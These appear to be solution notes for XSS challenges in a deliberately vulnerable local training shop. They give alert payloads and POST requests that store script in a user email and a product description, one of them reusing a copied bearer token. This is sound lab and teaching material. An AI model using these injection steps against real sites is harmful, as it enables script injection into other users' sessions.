### Perform a reflected XSS attack with <script>alert("XSS")</script>.
* Search
* Track Orders
### Perform a DOM XSS attack with <script>alert("XSS")</script>.	

#### Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a client-side security mechanism.
* Submit a POST request to http://localhost:3000/api/Users with
* Content-Type: application/json

* Post Params
  * {"email": "<script>alert(\"XSS\")</script>", "password": "anything"}
  
#### Perform a persisted XSS attack with <script>alert("XSS")</script> without using the frontend application at all.	

* Be authenticated
* Copy your Authorization header from an HTTP request submitted via browser.
* Submit a POST request to http://localhost:3000/api/Products with
* {"name": "XSS Juice", "description": "<script>alert(\"XSS\")</script>", "price": 23.99} as body,
* Content-Type: application/json
* Bearer ? as Authorization header, replacing the ? with the token you copied from the browser.

#### Perform a persisted XSS attack with <script>alert("XSS")</script> bypassing a server-side security mechanism.
